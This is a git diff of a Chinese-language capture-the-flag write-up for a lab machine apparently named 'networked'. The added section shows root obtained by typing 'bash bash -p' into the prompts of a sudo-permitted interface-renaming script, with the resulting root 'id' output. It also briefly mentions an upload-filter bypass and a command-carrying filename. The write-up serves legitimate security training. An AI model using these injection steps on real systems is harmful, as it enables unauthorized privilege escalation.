@@ -116,7 +116,7 @@ if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name
     }
 ```
 
-这里主要是判断，文件的```Content-Type```必须包含```image/```字样以及文件大小必须小于60000字节
+这里主要是判断文件的```Content-Type```必须包含```image/```字样以及文件大小必须小于60000字节
 
 ```
 $validext = array('.jpg', '.png', '.gif', '.jpeg');
@@ -296,7 +296,7 @@ $path的值是固定的，但是$value的值其实是我们上传的文件名，
 
 一开始我是从伪造IP的思路，但是修改了几个请求头都不能伪造我们的IP地址
 
-后来去到```/var/www/html/uploads```，发现这个目录是可写的，这就更加简单,只需要
+后来去到```/var/www/html/uploads```，发现这个目录是可写的，这就更加简单,只需要构建一个包含命令的文件名
 
 我们创建一个包含playload的文件名
 
@@ -369,3 +369,53 @@ done
 /sbin/ifup guly0
 
 ```
+
+尝试执行上面的脚本，它要求输入4个参数
+```
+sh-4.2$ sudo /usr/local/sbin/changename.sh
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+bash -p
+bash -p
+interface PROXY_METHOD:
+id
+id
+interface BROWSER_ONLY:
+whoami
+whoami
+interface BOOTPROTO:
+bash
+bash
+/etc/sysconfig/network-scripts/ifcfg-guly: line 4: -p: command not found
+/etc/sysconfig/network-scripts/ifcfg-guly: line 4: -p: command not found
+ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
+
+```
+
+我们看到有三行报错，其中```-p```显示```command not found```，这一个字符被当成了命令执行，我们再次构造输入命令
+```
+sh-4.2$ sudo /usr/local/sbin/changename.sh
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+bash bash -p
+bash bash -p
+interface PROXY_METHOD:
+bash bash -p
+bash bash -p
+interface BROWSER_ONLY:
+bash bash -p
+bash bash -p
+interface BOOTPROTO:
+bash bash -p
+bash bash -p
+[root@networked network-scripts]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
+
+把```-p```的位置变成了```bash -p```成功提权到了root
+我没太明白这个脚本是怎么回事，猜测是把我们的输入当成了命令执行
+
+# 总结
+很简单的靶机，基本上是白盒测试。上传漏洞要综合考虑apache版本，通过阅读源代码构造绕过限制的payload。Know it then Hack it。两次提权都是通过命令注入，提权到root通过观察报错信息猜测我们的输入被当成了命令执行，从而成功提权。
